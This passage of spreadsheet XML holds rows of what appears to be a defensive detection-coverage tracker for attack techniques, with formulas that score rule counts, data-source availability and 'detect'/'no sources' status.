        <f t="array" ref="M630">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N630" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O630" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P630" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S63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30" t="s">
        <v>2513</v>
      </c>
      <c r="U630" t="s">
        <v>2870</v>
      </c>
      <c r="V630" t="s">
        <v>2871</v>
      </c>
      <c r="W630" t="b">
        <v>1</v>
      </c>
      <c r="X630" t="s">
        <v>2853</v>
      </c>
    </row>
    <row r="631" spans="1:24" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A631" t="s">
        <v>2853</v>
      </c>
      <c r="B631" t="s">
        <v>2872</v>
      </c>
      <c r="C631" t="s">
        <v>2873</v>
      </c>
      <c r="D631" t="s">
        <v>1</v>
      </c>
      <c r="E631" t="s">
        <v>2540</v>
      </c>
      <c r="F631" s="9">
        <f t="shared" si="10"/>
        <v>1</v>
      </c>
      <c r="G631" s="9" cm="1">
        <f t="array" ref="G631">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H631" s="9" t="str" cm="1">
        <f t="array" ref="H631">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I631" s="9" t="str" cm="1">
        <f t="array" ref="I631">IF(SUM(IF($C631=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C631=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J631" s="9" t="str" cm="1">
        <f t="array" ref="J63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31" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M631" s="9" cm="1">
        <f t="array" ref="M631">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N631" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O631" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P631" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S63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31" t="s">
        <v>2513</v>
      </c>
      <c r="U631" t="s">
        <v>2874</v>
      </c>
      <c r="V631" t="s">
        <v>2875</v>
      </c>
      <c r="W631" t="b">
        <v>1</v>
      </c>
      <c r="X631" t="s">
        <v>2853</v>
      </c>
    </row>
    <row r="632" spans="1:24" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A632" t="s">
        <v>2853</v>
      </c>
      <c r="B632" t="s">
        <v>2876</v>
      </c>
      <c r="C632" t="s">
        <v>2877</v>
      </c>
      <c r="D632" t="s">
        <v>1</v>
      </c>
      <c r="E632" t="s">
        <v>2540</v>
      </c>
      <c r="F632" s="9">
        <f t="shared" si="10"/>
        <v>1</v>
      </c>
      <c r="G632" s="9" cm="1">
        <f t="array" ref="G632">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H632" s="9" t="str" cm="1">
        <f t="array" ref="H632">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I632" s="9" t="str" cm="1">
        <f t="array" ref="I632">IF(SUM(IF($C632=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C632=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J632" s="9" t="str" cm="1">
        <f t="array" ref="J63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32" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M632" s="9" cm="1">
        <f t="array" ref="M632">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N632" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O632" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P632" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S63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32" t="s">
        <v>2513</v>
      </c>
      <c r="U632" t="s">
        <v>2878</v>
      </c>
      <c r="W632" t="b">
        <v>1</v>
      </c>
      <c r="X632" t="s">
        <v>2853</v>
      </c>
    </row>
    <row r="633" spans="1:24" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A633" t="s">
        <v>2879</v>
      </c>
      <c r="B633" t="s">
        <v>2879</v>
      </c>
      <c r="C633" t="s">
        <v>42</v>
      </c>
      <c r="D633" t="s">
        <v>3</v>
      </c>
      <c r="E633" t="s">
        <v>463</v>
      </c>
      <c r="F633" s="9">
        <f t="shared" si="10"/>
        <v>2</v>
      </c>
      <c r="G633" s="9" cm="1">
        <f t="array" ref="G633">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H633" s="9" cm="1">
        <f t="array" ref="H633">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I633" s="9" t="str" cm="1">
        <f t="array" ref="I633">IF(SUM(IF($C633=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C633=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J633" s="9" t="str" cm="1">
        <f t="array" ref="J63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33" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M633" s="9" cm="1">
        <f t="array" ref="M633">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N633" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O633" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P633" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S63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33" t="s">
        <v>743</v>
      </c>
      <c r="U633" t="s">
        <v>2880</v>
      </c>
      <c r="V633" t="s">
        <v>2881</v>
      </c>
      <c r="W633" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="634" spans="1:24" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A634" t="s">
        <v>2882</v>
      </c>
      <c r="B634" t="s">
        <v>2882</v>
      </c>
      <c r="C634" t="s">
        <v>53</v>
      </c>
      <c r="D634" t="s">
        <v>2883</v>
      </c>
      <c r="E634" t="s">
        <v>2884</v>
      </c>
      <c r="F634" s="9">
        <f t="shared" si="10"/>
        <v>5</v>
      </c>
      <c r="G634" s="9" cm="1">
        <f t="array" ref="G634">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H634" s="9" cm="1">
        <f t="array" ref="H634">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I634" s="9" t="str" cm="1">
        <f t="array" ref="I634">IF(SUM(IF($C634=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C634=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J634" s="9" t="str" cm="1">
        <f t="array" ref="J63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34" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M634" s="9" cm="1">
        <f t="array" ref="M634">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N634" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O634" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P634" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S63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34" t="s">
        <v>743</v>
      </c>
      <c r="U634" t="s">
        <v>2885</v>
      </c>
      <c r="V634" t="s">
        <v>2886</v>
      </c>
      <c r="W634" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="635" spans="1:24" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A635" t="s">
        <v>2887</v>
      </c>
      <c r="B635" t="s">
        <v>2887</v>
      </c>
      <c r="C635" t="s">
        <v>106</v>
      </c>
      <c r="D635" t="s">
        <v>5</v>
      </c>
      <c r="E635" t="s">
        <v>2888</v>
      </c>
      <c r="F635" s="9">
        <f t="shared" si="10"/>
        <v>5</v>
      </c>
      <c r="G635" s="9" cm="1">
        <f t="array" ref="G635">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H635" s="9" cm="1">
        <f t="array" ref="H635">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I635" s="9" t="str" cm="1">
        <f t="array" ref="I635">IF(SUM(IF($C635=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C635=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J635" s="9" t="str" cm="1">
        <f t="array" ref="J63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35" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M635" s="9" cm="1">
        <f t="array" ref="M635">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N635" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O635" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P635" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S63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35" t="s">
        <v>2889</v>
      </c>
      <c r="U635" t="s">
        <v>2890</v>
      </c>
      <c r="V635" t="s">
        <v>2891</v>
      </c>
      <c r="W635" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="636" spans="1:24" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A636" t="s">
        <v>2892</v>
      </c>
      <c r="B636" t="s">
        <v>2892</v>
      </c>
      <c r="C636" t="s">
        <v>55</v>
      </c>
      <c r="D636" t="s">
        <v>6</v>
      </c>
      <c r="E636" t="s">
        <v>2893</v>
      </c>
      <c r="F636" s="9">
        <f t="shared" si="10"/>
        <v>4</v>
      </c>
      <c r="G636" s="9" cm="1">
        <f t="array" ref="G636">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>3</v>
      </c>
      <c r="H636" s="9" cm="1">
        <f t="array" ref="H636">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I636" s="9" t="str" cm="1">
        <f t="array" ref="I636">IF(SUM(IF($C636=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C636=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J636" s="9" t="str" cm="1">
        <f t="array" ref="J63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36" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M636" s="9" cm="1">
        <f t="array" ref="M636">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N636" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O636" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P636" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S63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36" t="s">
        <v>743</v>
      </c>
      <c r="U636" t="s">
        <v>2894</v>
      </c>
      <c r="V636" t="s">
        <v>2895</v>
      </c>
      <c r="W636" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="637" spans="1:24" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A637" t="s">
        <v>2896</v>
      </c>
      <c r="B637" t="s">
        <v>2896</v>
      </c>
      <c r="C637" t="s">
        <v>109</v>
      </c>
      <c r="D637" t="s">
        <v>8</v>
      </c>
      <c r="E637" t="s">
        <v>2897</v>
      </c>
      <c r="F637" s="9">
        <f t="shared" si="10"/>
        <v>2</v>
      </c>
      <c r="G637" s="9" cm="1">
        <f t="array" ref="G637">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H637" s="9" cm="1">
        <f t="array" ref="H637">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I637" s="9" t="str" cm="1">
        <f t="array" ref="I637">IF(SUM(IF($C637=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C637=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J637" s="9" t="str" cm="1">
        <f t="array" ref="J63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37" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M637" s="9" cm="1">
        <f t="array" ref="M637">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N637" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O637" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P637" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S63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37" t="s">
        <v>743</v>
      </c>
      <c r="U637" t="s">
        <v>2898</v>
      </c>
      <c r="V637" t="s">
        <v>2899</v>
      </c>
      <c r="W637" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="638" spans="1:24" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A638" t="s">
        <v>2900</v>
      </c>
      <c r="B638" t="s">
        <v>2900</v>
      </c>
      <c r="C638" t="s">
        <v>198</v>
      </c>
      <c r="D638" t="s">
        <v>8</v>
      </c>
      <c r="E638" t="s">
        <v>434</v>
      </c>
      <c r="F638" s="9">
        <f t="shared" si="10"/>
        <v>3</v>
      </c>
      <c r="G638" s="9" cm="1">
        <f t="array" ref="G638">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H638" s="9" cm="1">
        <f t="array" ref="H638">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>1</v>
      </c>
      <c r="I638" s="9" t="str" cm="1">
        <f t="array" ref="I638">IF(SUM(IF($C638=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C638=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J638" s="9" cm="1">
        <f t="array" ref="J63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0</v>
      </c>
      <c r="K638" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M638" s="9" cm="1">
        <f t="array" ref="M638">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N638" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O638" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P638" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S63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38" t="s">
        <v>485</v>
      </c>
      <c r="U638" t="s">
        <v>2901</v>
      </c>
      <c r="V638" t="s">
        <v>2902</v>
      </c>
      <c r="W638" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="639" spans="1:24" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A639" t="s">
        <v>2900</v>
      </c>
      <c r="B639" t="s">
        <v>2903</v>
      </c>
      <c r="C639" t="s">
        <v>2904</v>
      </c>
      <c r="D639" t="s">
        <v>8</v>
      </c>
      <c r="E639" t="s">
        <v>451</v>
      </c>
      <c r="F639" s="9">
        <f t="shared" si="10"/>
        <v>4</v>
      </c>
      <c r="G639" s="9" cm="1">
        <f t="array" ref="G639">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H639" s="9" t="str" cm="1">
        <f t="array" ref="H639">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I639" s="9" t="str" cm="1">
        <f t="array" ref="I639">IF(SUM(IF($C639=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C639=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J639" s="9" t="str" cm="1">
        <f t="array" ref="J63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39" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M639" s="9" cm="1">
        <f t="array" ref="M639">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N639" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O639" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P639" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S63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39" t="s">
        <v>368</v>
      </c>
